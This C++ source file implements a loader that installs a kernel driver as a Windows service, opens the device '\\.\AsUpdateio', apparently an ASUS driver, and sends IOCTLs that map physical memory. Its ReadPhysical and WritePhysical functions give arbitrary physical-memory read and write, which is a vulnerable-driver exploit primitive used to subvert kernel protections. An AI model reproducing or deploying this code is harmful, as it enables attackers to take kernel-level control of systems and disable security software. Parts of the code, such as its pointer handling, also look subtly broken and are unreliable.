#include "Driver.h"
SC_HANDLE Driver::OpenSCM() {
    return OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
}
SC_HANDLE Driver::OpenDriverService(SC_HANDLE hSCM) {
    return OpenService(hSCM, _ServiceName, SERVICE_ALL_ACCESS);
}
void Driver::CloseHandles(SC_HANDLE hService, SC_HANDLE hSCM) {
    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);
}

NTSTATUS Driver::CreateDriver() {
    SC_HANDLE hSCM = OpenSCM();
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager (%d)\n", GetLastError());
        return ERROR_SCM_OPEN;
    }

    SC_HANDLE hService = CreateService(hSCM,
        _ServiceName,
        _ServiceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        _DriverLocation,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    if (hService == NULL) {
        printf("[-] Failed to create service (%d)\n", GetLastError());
        CloseHandles(NULL, hSCM);
        return ERROR_SERVICE_CREATE;
    }
    printf("[-] Created Driver: %s\n", _ServiceName);
    CloseHandles(hService, hSCM);
    return 0;
}
NTSTATUS Driver::DeleteDriver() {
    SC_HANDLE hSCM = OpenSCM();
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager (%d)\n", GetLastError());
        return ERROR_SCM_OPEN;
    }

    SC_HANDLE hService = OpenDriverService(hSCM);
    if (hService == NULL) {
        printf("[-] Failed to open service (%d)\n", GetLastError());
        CloseHandles(NULL, hSCM);
        return ERROR_SERVICE_OPEN;
    }
    if (!DeleteService(hService)) {
        printf("[-] Failed to delete the driver service (%d)\n", GetLastError());
        CloseHandles(hService, hSCM);
        return ERROR_SERVICE_DELETE;
    }
    printf("[-] Deleted Driver: %s\n", _ServiceName);
    CloseHandles(hService, hSCM);
    return 0;
}

NTSTATUS Driver::StartDriver() {
    NTSTATUS CreateStatus = CreateDriver();
    if (!CreateStatus) {
        SC_HANDLE hSCM = OpenSCM();
        if (hSCM == NULL) {
            printf("[-] Failed to open Service Control Manager (%d)\n", GetLastError());
            DeleteDriver();
            return ERROR_SCM_OPEN;
        }

        SC_HANDLE hService = OpenDriverService(hSCM);
        if (hService == NULL) {
            printf("[-] Failed to open service (%d)\n", GetLastError());
            CloseHandles(NULL, hSCM);
            DeleteDriver();
            return ERROR_SERVICE_OPEN;
        }
        if (!StartServiceA(hService, 0, NULL)) {
            printf("[-] Failed to start the driver service (%d)\n", GetLastError());
            CloseHandles(hService, hSCM);
            DeleteDriver();
            return ERROR_SERVICE_START;
        }
        printf("[-] Started Driver: %s\n", _ServiceName);
        CloseHandles(hService, hSCM);
        _DriverHandle = CreateFileA("\\\\.\\AsUpdateio", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (!_DriverHandle) {
            StopDriver();
            printf("[-] Failed to open handle to driver (%d)\n", GetLastError());
            return ERROR_SERVICE_CREATEFILE;
        }
        printf("[-] DriverHandle: %d\n", _DriverHandle);
        return 0;
    }
    return CreateStatus;
}
NTSTATUS Driver::StopDriver() {
    CloseHandle(_DriverHandle);
    SC_HANDLE hSCM = OpenSCM();
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager (%d)\n", GetLastError());
        DeleteDriver();
        return ERROR_SCM_OPEN;
    }

    SC_HANDLE hService = OpenDriverService(hSCM);
    if (hService == NULL) {
        printf("[-] Failed to open service (%d)\n", GetLastError());
        CloseHandles(NULL, hSCM);
        DeleteDriver();
        return ERROR_SERVICE_OPEN;
    }

    SERVICE_STATUS serviceStatus;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        printf("[-] Failed to stop the driver service (%d)\n", GetLastError());
        CloseHandles(hService, hSCM);
        DeleteDriver();
        return ERROR_SERVICE_CONTROL;
    }

    while (serviceStatus.dwCurrentState != SERVICE_STOPPED) {
        Sleep(1000);
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            printf("[-] Failed to query the service status (%d)\n", GetLastError());
            CloseHandles(hService, hSCM);
            DeleteDriver();
            return ERROR_SERVICE_QUERY;
        }
    }
    printf("[-] Stopped Driver: %s\n", _ServiceName);
    CloseHandles(hService, hSCM);
    return DeleteDriver();
}


bool Driver::ReadPhysical(__int64 PhysicalAddr, void* Buffer, int Size)
{

    DWORD bytesReturned;
    ASUSCall D;
    D.AddressSpace = 0;
    D.InterFaceSize = 0;
    D.InterFaceType = 1;
    D.SIZE = (int)(Size - (unsigned int)(unsigned __int16)PhysicalAddr);
    D.PhysicalAddress = PhysicalAddr;

    __int64* BufferReturn = new __int64;
    if (!DeviceIoControl(_DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }



    memcpy(&BufferReturn, BufferReturn, 4);
    memcpy(Buffer, (void*)BufferReturn, Size);
    __int64* Data = BufferReturn;
    if (!DeviceIoControl(_DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }
    delete BufferReturn;
    return true;
}
bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int Size) {
    DWORD BytesReturned;
    ASUSCall D;
    D.AddressSpace = 0;
    D.InterFaceSize = 0;
    D.InterFaceType = 1;
    D.SIZE = (int)(Size - (unsigned int)(unsigned __int16)PhysicalAddr);
    D.PhysicalAddress = PhysicalAddr;

    __int64* BufferReturn = new __int64;
    if (!DeviceIoControl(_DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &BytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }



    memcpy(&BufferReturn, BufferReturn, 4);
    memcpy(BufferReturn, (void*)Buffer, Size);
    __int64* Data = BufferReturn;
    if (!DeviceIoControl(_DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &BytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }
    delete BufferReturn;
    return true;

}